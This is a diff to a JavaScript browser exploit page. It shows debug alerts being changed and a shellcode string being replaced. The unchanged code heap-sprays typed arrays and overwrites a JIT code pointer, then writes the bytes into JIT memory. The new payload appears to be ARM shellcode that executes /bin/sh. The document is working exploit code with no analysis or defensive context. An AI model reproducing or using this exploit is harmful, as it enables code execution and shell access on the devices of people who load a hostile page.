@@ -1,5 +1,5 @@
 <script>	
-alert("start65");
+alert("start64");
 function func2(){
 for(var i=0;i<0x1000;i++){ 
 
@@ -9,6 +9,7 @@ for(var i=0;i<0x1000;i++){
  function func(){
   return 2
  }
+ alert(func());
  for (var i=0; i<0x1000; i++) {
   func()
  }
@@ -159,8 +160,8 @@ spray[spray_index][typedarray_index+0x38/4]=jitcode_addr-0x18;//addr;
 var jit_index=typedarray_index+0x38/4;
 var typedarray=spray[spray_index];
 var myarr=arrcvs[0];
-var shellcode="\x0e\x20\xa0\xe1\x10\x20\x04\xe5\x70\x80\x9f\xe5\x08\x80\x04\xe5\x00\x10\x84\xe2\x68\x30\x9f\xe5\x00\x80\x93\xe5\x00\x01\x58\xe1\x00\x05\x00\x3a\x00\x01\xa0\xe3\x00\x10\xe0\xe3\x10\x20\x14\xe5\x28\x40\x14\xe5\x02\xe0\xa0\xe1\x1e\xff\x2f\xe1";
- for(var i=0;i<shellcode.length;i++){
+var shellcode="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68";
+for(var i=0;i<shellcode.length;i++){
  myarr[0]=shellcode.charCodeAt(i);
  typedarray[jit_index]+=1;
 }
